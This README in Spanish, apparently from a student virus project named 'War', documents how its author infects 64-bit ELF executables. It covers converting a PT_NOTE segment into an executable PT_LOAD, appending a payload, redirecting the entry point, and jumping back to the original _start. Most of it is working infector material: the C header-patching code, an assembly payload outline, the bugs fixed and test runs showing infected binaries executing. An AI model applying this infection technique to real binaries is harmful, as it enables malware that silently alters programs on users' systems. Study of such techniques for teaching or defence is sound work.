# Inyectar malware polimórfico en binario de 64 bits

## 0. Resumen del camino recorrido

Este README documenta **cómo llegamos** al método que funciona, no solo el método final. El camino tuvo un callejón sin salida (secuestrar el segmento `PT_LOAD` ejecutable) y un giro (secuestrar un `PT_NOTE`). Documentar ambos es importante porque **el `PT_LOAD` parece la opción obvia** y es la que primero se intenta. Entender **por qué falla** ahorra horas de depuración.

| Fase | Qué probamos | Resultado |
|---|---|---|
| 1 | Secuestrar el `PT_LOAD` ejecutable de `ls` | ❌ Corrompe `.dynamic`, rompe `ld.so`, segfault |
| 2 | Añadir un `PT_LOAD` nuevo al final | ✅ Funciona, pero requiere realinear y controlar `p_align` |
| 3 | Secuestrar un `PT_NOTE` y convertirlo en `PT_LOAD` | ✅ **Método final**, el más limpio |

---

## 1. Leer el file header

```bash
readelf -h /bin/ls
```

```text
ELF Header:
  Magic:   7f 45 4c 46 02 01 01 00 00 00 00 00 00 00 00 00
  Class:                             ELF64
  Data:                              2's complement, little endian
  Type:                              DYN (Position-Independent Executable file)
  Machine:                           Advanced Micro Devices X86-64
  Entry point address:               0x6aa0
  Start of program headers:          64 (bytes into file)
  Size of program headers:           56 (bytes)
  Number of program headers:         13
  Start of section headers:          136232 (bytes into file)
  Number of section headers:         31
```

Campos que importan:

- **`e_entry = 0x6aa0`** — dirección virtual del `_start`.
- **`e_phoff = 64`** — offset en el archivo donde empieza la tabla de *Program Headers*.
- **`e_phentsize = 56`** — tamaño de cada `Elf64_Phdr`.
- **`e_phnum = 13`** — número de `Phdr` (segmentos).

---

## 2. Buscar el `PT_LOAD` ejecutable (primer intento)

```bash
readelf -lW /bin/ls | grep LOAD
```

```text
  LOAD  0x000000 0x0000000000000000 0x0000000000000000 0x003458 0x003458 R   0x1000
  LOAD  0x004000 0x0000000000004000 0x0000000000004000 0x013091 0x013091 R E 0x1000   <=
  LOAD  0x018000 0x0000000000018000 0x0000000000018000 0x007458 0x007458 R   0x1000
  LOAD  0x01ffd0 0x0000000000020fd0 0x0000000000020fd0 0x0012a8 0x002570 RW  0x1000
```

El segmento ejecutable es el segundo: `p_offset = 0x4000`, `p_vaddr = 0x4000`, `p_filesz = 0x13091`, `p_flags = R E`, `p_align = 0x1000`.

**Tentación:** secuestrar este `PT_LOAD` (cambiar `p_offset`/`p_vaddr`/`p_filesz` para que apunte al payload al final del archivo) y poner `e_entry` en el payload. **Es lo que primero intentamos. No funciona.** Vamos a ver por qué.

---

## 3. Calcular el final del segmento ejecutable

```bash
readelf -lW /bin/ls | awk '$1=="LOAD" && $7=="R" && $8=="E" {print $2, $5}'
# 0x004000 0x013091

printf '0x%x\n' $((0x004000 + 0x013091))
# 0x17091
```

`offset + filesz = 0x4000 + 0x13091 = 0x17091`. Ese es el final del segmento ejecutable en el **archivo**.

---

## 4. Callejón sin salida: secuestrar el `PT_LOAD` ejecutable

La idea era:

1. Alargar el `PT_LOAD` ejecutable para que cubra también el payload al final del archivo.
2. Poner `e_entry` al inicio del payload.
3. El payload se ejecuta, hace su magia, y salta al `_start` original (`0x6aa0`).

**Por qué no funciona:**

- El `PT_LOAD` ejecutable **comparte página** con el `PT_LOAD` RW que contiene `.dynamic`. Si alargas el ejecutable hasta el final del archivo, el kernel mapea **la misma página** para ambos segmentos, y el último gana. **El payload pisa `.dynamic`**, y `ld.so` revienta al procesarla (`SEGV` en `audit_list_add_dynamic_tag`).
- Para evitarlo, habría que **realinear** el nuevo `p_offset`/`p_vaddr` a `p_align` y asegurarse de que **no comparte página** con ningún otro segmento. Eso requiere recalcular `p_vaddr` de **todos** los segmentos, lo cual es frágil.

**Conclusión:** secuestrar el `PT_LOAD` ejecutable es posible, pero **requiere reescribir la tabla de segmentos entera**. No es la opción más limpia.

---

## 5. El giro: secuestrar un `PT_NOTE`

Los `PT_NOTE` son segmentos que el **kernel ignora** (solo los usa el linker para notas de build-id, ABI, etc.). **No se mapean en memoria**, **no se ejecutan**, y **el loader no los necesita para arrancar**.

**Idea:** convertir un `PT_NOTE` en un `PT_LOAD` ejecutable que apunte al payload. Así:

- No tocamos el `PT_LOAD` original.
- No pisamos `.dynamic`.
- Solo cambiamos **un** `Phdr` (`p_type`, `p_offset`, `p_vaddr`, `p_filesz`, `p_memsz`, `p_flags`, `p_align`).
- Ponemos `e_entry` al payload.
- El payload se ejecuta, hace su magia, y salta al `_start` original.

```bash
readelf -lW /bin/ls | grep NOTE
```

```text
  NOTE  0x000350 0x0000000000000350 0x0000000000000350 0x000024 0x000024 R   0x4
  NOTE  0x0020f8 0x0000000000020f8 0x0000000000020f8 0x000030 0x000030 R   0x8
  NOTE  0x002128 0x000000000002128 0x000000000002128 0x000020 0x000020 R   0x4
```

**Elegimos el primer `PT_NOTE`** (el de build-id, `p_offset = 0x350`). Lo convertimos en `PT_LOAD` y lo apuntamos al payload al final del archivo.

---

## 6. Cálculo del nuevo segmento (el que funciona)

```c
// insertion_point = final del archivo (EOF)
off_t insertion_point = war->file_size;

// alinear a p_align (0x1000) para que el kernel mapee una página limpia
off_t aligned_insertion = (insertion_point + 0xfff) & ~0xfff;

// nueva vaddr: por encima de todos los PT_LOAD existentes
uint64_t max_vaddr = 0;
for (int j = 0; j < e_phnum; j++) {
    if (phdr[j].p_type == PT_LOAD) {
        uint64_t end = phdr[j].p_vaddr + phdr[j].p_memsz;
        if (end > max_vaddr) max_vaddr = end;
    }
}
uint64_t new_vaddr = (max_vaddr + 0xfff) & ~0xfff;
```

**Por qué `aligned_insertion` y no `insertion_point`:**

- `insertion_point` es el tamaño original del archivo (p.ej. `16000`).
- `aligned_insertion` es la página alineada (p.ej. `16384`).
- El payload se escribe en `aligned_insertion`, no en `insertion_point`.
- **Si usas `insertion_point` para calcular `sig_offset` (el offset de la firma), apuntas al hueco de padding, no a la firma.** Este fue **el bug final** que nos costó más encontrar.

**Por qué `new_vaddr` por encima de todos los `PT_LOAD`:**

- Si lo pones en una dirección que ya está mapeada por otro `PT_LOAD`, el kernel mapea **dos segmentos en la misma página** y el último gana. **El payload pisa datos del otro segmento.**
- Poniéndolo por encima de todo, el kernel mapea una **página nueva** para el payload. **Cero solapamiento.**

---

## 7. Parcheo del `PT_NOTE` y del `e_entry`

```c
// convertir el PT_NOTE en PT_LOAD ejecutable
phdr[note_index].p_type   = PT_LOAD;
phdr[note_index].p_flags  = PF_R | PF_X;
phdr[note_index].p_offset = aligned_insertion;
phdr[note_index].p_vaddr  = new_vaddr;
phdr[note_index].p_paddr  = new_vaddr;
phdr[note_index].p_filesz = src_payload_bin_len + sig_len;
phdr[note_index].p_memsz  = src_payload_bin_len + sig_len;
phdr[note_index].p_align  = 0x1000;

// redirigir e_entry al payload
war->header->e_entry = new_vaddr;
```

Y en el payload:

```c
// entry_delta: EP_orig - new_vaddr
uint64_t entry_delta = war->header->e_entry_original - new_vaddr;
memcpy(payload + 2, &entry_delta, sizeof(uint64_t));

// sig_offset: dónde está la firma en el archivo
uint64_t sig_off = aligned_insertion + src_payload_bin_len;
memcpy(payload + 10, &sig_off, sizeof(uint64_t));
```

**El payload lee `entry_delta` en `payload + 2` y `sig_offset` en `payload + 10`.** Ambos son **absolutos**, no relativos. Esto evita los bugs de "buscar la firma en el mapeo" y "calcular el delta con `p_vaddr` incorrecto".

---

## 8. El payload: los 3 bugs que resolvimos

### Bug 1: `rtld_fini` machacado por `mmap`

El payload hace `mmap` del binario para leerlo. **`mmap` usa `rdx` como tercer argumento (`prot`).** Eso **machaca `rdx`**, que el kernel había puesto a `rtld_fini` para `_start`. **Sin `push rdx` / `pop rdx`, `_start` recibe `rdx` basura y `__libc_start_main` revienta** (`SEGV` en `0x4229`).

**Fix:** `push rdx` al entrar al payload, `pop rdx` antes del `jmp` al `_start`.

### Bug 2: `path_temporal` corrompido por la búsqueda de la firma

La primera versión del payload **buscaba `"War version 1.0"` en el mapeo** para encontrar la firma. **Encontraba la copia del payload, no la del EOF**, y escribía la fecha incrementada **encima de `path_temporal`** (`/tmp/.hidden` → `/tmp/.hid5169`).

**Fix:** eliminar la búsqueda. **`ft_infect` guarda `sig_offset` en `payload + 10`.** El payload lee ese offset **directo** y va a la firma.

### Bug 3: `add rdi, 32` en vez de buscar el último guion

El payload, una vez en la firma, hacía `add rdi, 32` para apuntar a la fecha `2026`. **Pero `2026` está en `+30`, no `+32`.** Leía `26 ' '` o `54`, y escribía `205451y` en vez de `2027`.

**Fix:** `add rdi, 30` apunta al `'2'` de `2026`. Pero luego el diseño cambió: **el payload ahora busca el último guion** (`davgalle - 39775`) y incrementa **ese** número. **La fecha `2026` se queda fija.**

---

## 9. El `.s` final (resumen)

```asm
data_start:
entry_delta:    dq 0xDEADBEEF               ; offset 2
sig_offset:     dq 0xDEADBEEF               ; offset 10
path_self:      db "/proc/self/exe", 0      ; offset 18
path_temporal:  db "/tmp/.hidden", 0        ; offset 33

code_start:
    push rbx / rbp / r12-r15 / rdx          ; guardar registros + rtld_fini
    ...
    ; ir a sig_offset, buscar el ÚLTIMO guion, incrementar el número de 5 dígitos
    ; (ver código completo en src/payload.s)
    ...
    pop rdx / r15-r12 / rbp / rbx           ; restaurar
    jmp [base_payload + entry_delta]        ; saltar al _start original
```

---

## 10. Resultado

```bash
cp mi_binario /tmp/test/mi_binario
./War
strings /tmp/test/mi_binario | tail -1
# War version 1.0 (c)oded Oct - 2026 by davgalle - 39774

/tmp/test/mi_binario
strings /tmp/test/mi_binario | tail -1
# War version 1.0 (c)oded Oct - 2026 by davgalle - 39775

./War
strings /tmp/test/mi_binario | tail -1
# War version 1.0 (c)oded Oct - 2026 by davgalle - 39776
```

**La fecha `2026` se queda fija. El contador `3977X` sube con `./War` y con la ejecución del binario.** `path_temporal` intacto. `Hola mundo!` sin segfault.

---

## 11. Limitación conocida: coreutils

`/bin/ls` y otras utilidades de **GNU coreutils** tienen una comprobación interna: leen `/proc/self/exe` y verifican que el nombre coincide con la utilidad. **Cuando el payload hace `rename("/tmp/.hidden", path)`, el kernel marca `/proc/self/exe` como `(deleted)`.** Coreutils lo detecta y aborta con `Security violation`.

**El payload hizo su trabajo (subir el contador) antes de que coreutils abortara.** Es una limitación de coreutils, no de nuestro infector. **Para binarios que no son coreutils (p.ej. `mi_binario`), todo funciona.**

---